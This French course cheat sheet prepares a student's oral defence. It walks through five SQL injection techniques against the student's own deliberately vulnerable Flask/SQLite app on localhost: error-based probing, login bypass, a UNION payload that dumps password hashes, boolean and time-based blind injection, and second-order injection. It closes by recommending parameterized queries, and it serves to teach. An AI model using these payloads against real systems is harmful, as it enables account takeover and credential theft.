# Scénarios d'injections SQL — Application Agora (Version Vulnérable)
# Aide-mémoire pour la soutenance — INF4258 2025-2026

---

## PROCÉDURE DE RÉINITIALISATION (avant chaque démonstration)

1. Arrêter Flask : Ctrl+C dans le terminal
2. Recréer la base : python database/init_db.py
3. Vider les cookies Chrome : F12 → Application → Cookies → Supprimer session
4. Relancer Flask : python vulnerable/app.py
5. Se connecter : tsahui@agora.cm / password123

---

## INJECTION 1 — Classique Error-based
**Page :** http://127.0.0.1:5000/connexion
**Objectif :** Provoquer une erreur SQL visible révélant des informations sur la base

### Démonstration 1a — Reconnaissance (erreur SQL)
- Champ Email : '
- Champ Mot de passe : (laisser vide)
- Résultat attendu : Erreur SQL exposée → "unrecognized token"
- Ce que ça révèle : type de BDD (SQLite), structure des requêtes, vulnérabilité confirmée

### Démonstration 1b — Contournement d'authentification
- Champ Email : tsahui@agora.cm'--
- Champ Mot de passe : blabla (n'importe quoi)
- Résultat attendu : Connexion réussie sans mot de passe correct
- Requête exécutée :
  SELECT * FROM utilisateurs WHERE email = 'tsahui@agora.cm'--' AND mot_de_passe != ''
- Explication : -- commente la vérification du mot de passe

---

## INJECTION 2 — UNION-based
**Page :** http://127.0.0.1:5000/recherche
**Objectif :** Extraire les mots de passe hashés de tous les utilisateurs

### Payload à coller dans le champ de recherche :
' UNION SELECT id, mot_de_passe, email, bio, photo_profil FROM utilisateurs--

- Résultat attendu : Les hashs de mots de passe s'affichent à la place des pseudos
- Requête exécutée :
  SELECT id, pseudo, bio, email, photo_profil FROM utilisateurs
  WHERE pseudo LIKE '%' UNION SELECT id, mot_de_passe, email, bio,
  photo_profil FROM utilisateurs--%'
- Explication : UNION accroche une 2ème requête qui lit mot_de_passe
  à la place de pseudo — 5 colonnes dans les deux requêtes obligatoire

---

## INJECTION 3 — Blind Boolean-based
**Page :** http://127.0.0.1:5000/profil/tsahui
**Objectif :** Extraire des informations par déduction sans retour de données direct

### Étape 1 — Confirmer la vulnérabilité (condition vraie) :
URL : http://127.0.0.1:5000/profil/tsahui' AND '1'='1
Résultat attendu : Page du profil s'affiche normalement ✅

### Étape 2 — Confirmer l'oracle (condition fausse) :
URL : http://127.0.0.1:5000/profil/tsahui' AND '1'='2
Résultat attendu : Redirection vers le fil "Utilisateur introuvable" ❌

### Étape 3 — Extraire une information précise :
URL : http://127.0.0.1:5000/profil/tsahui' AND SUBSTRING(email,1,1)='t
Résultat attendu : Page s'affiche ✅ → premier caractère de l'email = t

URL : http://127.0.0.1:5000/profil/tsahui' AND SUBSTRING(email,1,1)='z
Résultat attendu : Redirection ❌ → premier caractère n'est pas z

- Explication : En testant chaque caractère, l'attaquant reconstitue
  n'importe quelle donnée sans qu'aucune info ne soit retournée directement

---

## INJECTION 4 — Blind Time-based
**Page :** http://127.0.0.1:5000/fil
**Objectif :** Démontrer qu'une injection peut être totalement invisible
**Outil :** Ouvrir F12 → onglet Network avant de lancer la requête

### Payload (condition vraie — page lente) :
URL : http://127.0.0.1:5000/fil?tri=date_publication,CASE%20WHEN%20(SELECT%20COUNT(*)%20FROM%20utilisateurs)>0%20THEN%20RANDOMBLOB(100000000)%20ELSE%20date_publication%20END

Résultat attendu : Page met ~15 secondes à charger (visible dans Network)

### Comparaison (page normale) :
URL : http://127.0.0.1:5000/fil
Résultat attendu : Page charge en moins de 100ms

- Explication : RANDOMBLOB(100000000) génère 100 Mo de données aléatoires
  ce qui consomme du CPU — équivalent SQLite de SLEEP()
- Ce qui est dangereux : aucun changement visible dans la page,
  seul le temps de réponse varie — très difficile à détecter

---

## INJECTION 5 — Second-Order
**Pages :** Inscription → Connexion → Modification du profil
**Objectif :** Modifier le compte tsahui sans connaître son mot de passe

### TEMPS 1 — Poser la bombe (page d'inscription)
URL : http://127.0.0.1:5000/inscription
- Pseudo    : tsahui'--
- Email     : attaquant@evil.cm
- Mot passe : crack237
- Résultat  : Compte créé — pseudo malveillant stocké en base sans injection

### TEMPS 2 — Se connecter avec le compte attaquant
URL : http://127.0.0.1:5000/connexion
- Email     : attaquant@evil.cm
- Mot passe : crack237

### TEMPS 3 — Faire exploser la bombe (modification du profil)
URL : http://127.0.0.1:5000/modifier-profil
- Email : tsahui@agora.cm   ← email du compte cible, pas le sien
- Bio   : Bio modifiee par attaquant   ← sans apostrophe
- Clic sur Enregistrer

Résultat attendu : Bio du compte tsahui modifiée par l'attaquant
Requête exécutée :
  UPDATE utilisateurs SET bio='Bio modifiee par attaquant',
  email='tsahui@agora.cm' WHERE pseudo='tsahui'--'
  → SQLite reçoit : WHERE pseudo='tsahui' (le -- commente la suite)

### PREUVE FINALE
Se déconnecter puis se reconnecter avec tsahui@agora.cm / password123
→ La bio affiche "Bio modifiee par attaquant" sur son profil

- Explication : La faille réside dans la confiance aveugle accordée
  aux données provenant de la base — même les données stockées
  peuvent être malveillantes si elles ne sont pas traitées
  au moment de leur réutilisation dans une requête

---

## POINTS CLÉS À RETENIR POUR LA SOUTENANCE

1. Toutes les injections exploitent UN seul principe fondamental :
   les entrées utilisateur sont interprétées comme du CODE et non comme des DONNÉES

2. Chaque injection démontre un niveau de discrétion croissant :
   Error-based (bruyante) → UNION (visible) → Boolean (silencieuse) 
   → Time-based (invisible) → Second-Order (différée)

3. La contre-mesure universelle : les requêtes paramétrées (?)
   Elles garantissent que toute saisie est traitée comme une DONNÉE
   et jamais comme du CODE, quelle que soit son contenu

4. Le hashage des mots de passe est une défense complémentaire
   mais ne remplace pas la protection contre les injections SQL